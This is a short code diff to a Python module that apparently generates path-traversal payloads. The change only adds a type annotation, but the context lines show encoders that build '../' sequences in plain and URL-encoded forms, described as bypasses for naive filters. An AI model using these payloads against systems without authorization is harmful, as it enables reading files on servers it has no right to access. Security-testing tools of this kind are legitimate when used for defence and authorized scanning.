@@ -14,6 +14,7 @@ import asyncio
 import re
 import urllib.error
 import urllib.request
+from collections.abc import Callable
 from typing import Any
 from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
 
@@ -28,7 +29,7 @@ _TARGETS: list[tuple[str, re.Pattern[str], str]] = [
 
 # Traversal encoders — each takes a depth and the target, returns one payload string. Covers the
 # plain sequence plus the bypasses that beat naive ../ stripping and single-decode filters.
-_ENCODERS = [
+_ENCODERS: list[Callable[[int, str], str]] = [
     lambda d, t: "../" * d + t,  # plain
     lambda d, t: "..%2f" * d + t,  # url-encoded slash
     lambda d, t: "%2e%2e%2f" * d + t,  # fully url-encoded
